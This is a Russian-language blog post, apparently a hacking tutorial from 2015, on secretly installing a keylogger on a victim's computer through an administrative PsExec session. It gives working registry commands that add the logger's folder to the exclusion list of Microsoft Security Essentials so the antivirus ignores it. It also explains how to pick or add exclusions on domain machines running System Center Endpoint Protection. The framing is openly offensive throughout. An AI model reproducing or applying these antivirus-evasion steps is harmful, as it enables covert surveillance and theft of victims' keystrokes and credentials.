---
title: "Удалённая установка кейлоггера на компьютер с Microsoft Security Essentials или System Center Endpoint Protection"
date: 2015-02-15
---

**Дано:** Сессия PsExec (либо любая другая) с административными привилегиями на машине жертвы. У жертвы установлен Microsoft Security Essentials либо System Center Endpoint Protection.  
**Задача:** Незаметно для жертвы установить кейлоггер.  
  
Разберём неправильный и правильный способ решения данной задачи.  
  


###  **Неправильный способ**

**  
**

Для начала проверим, что произойдёт, если попробовать установить логгер "в лоб" без всяких ухищрений. Собираем бинарник, задаём в качестве рабочей директории что-нибудь неприметное, например  **c:\Windows\SysWOW64\WindowsPowerShell\**  
  
1\. Открываем сессию PsExec  
  
[![](/images/1.1.jpg)](/images/1.1.jpg)  
  


2\. Кидаем установщик логгера в директорию **c:\Windows\SysWOW64\WindowsPowerShell\**  и запускаем  
  
**c:\Windows\SysWOW64\WindowsPowerShell\trojan.exe**  
**  
**  


[![](/images/8.1.jpg)](/images/8.1.jpg)  


  


Ищем процесс кейлоггера

  


**tasklist /fi "IMAGENAME eq VME.exe"**

  


[![](/images/3.jpg)](/images/3.jpg)

  


  


  
  
  
Его нет. А почему? Да потому что, антивирус успешно отработал и радостно сообщил об этом жертве.

  


[![](/images/4.jpg)](/images/4.jpg)

  


  


[![](/images/5.jpg)](/images/5.jpg)

  


  
  
Операция провалена...

  


###  Правильный способ

  


Теперь пойдём другим путём и установим логгер в директорию, которая не будет проверятся антивирусом.  
  
Список исключений для Microsoft Security Essentials хранится в ключе реестра **HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths**  
  
1\. Для начала проверим его содержимое

  


**reg query "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths"**

  


[![](/images/6.jpg)](/images/6.jpg)

  


  


  
  
  
  
  
  
В данном случае список исключений пуст.  

  


2. Добавим в исключения директорию **c:\Windows\SysWOW64\WindowsPowerShell\**

  


**reg add "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths" /v c:\Windows\SysWOW64\WindowsPowerShell\ /d "1" /t REG_DWORD**

  


и проверим результат

  


**reg query "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths"**

  


  


[![](/images/7.1.jpg)](/images/7.1.jpg)

  
  
3\. Помещаем логгер в выбранный нами каталог и запускаем его

  


**c:\Windows\SysWOW64\WindowsPowerShell\trojan.exe**

  


[![](/images/8.1.jpg)](/images/8.1.jpg)

  


Проверяем результат:

  


**tasklist /fi "IMAGENAME eq VME.exe"**

  


[![](/images/9.jpg)](/images/9.jpg)

  


PROFIT! Логгер запущен, а антивирус жертвы ни о чём не подозревает

  


[![](/images/10.jpg)](/images/10.jpg)

  


  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  


### 

###    


###  Поправка на домен

  


В случае когда жертва является членом домена AD и вместо **Essentials** у неё установлен **System Center Endpoint Protection** , логика действий будет немного другой. Endpoint Protection, как и  Essentials хранит исключения в HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths, но их список, скорее всего, будет настроен централизованно через политики защиты. В этом случае наши изменения будут перезаписаны после повторного применения политики, поэтому у нас есть два варианта действий:  


  * Если список исключений задан (в реестре есть какие-либо записи) устанавливаем логгер в любой из перечисленных там каталогов;
  * Если список исключений не задан (записи в реестре отсутствуют) то политика исключений не настроена и мы можем смело вписывать туда нужный нам каталог.



В остальном порядок действий ничем не отличается. 
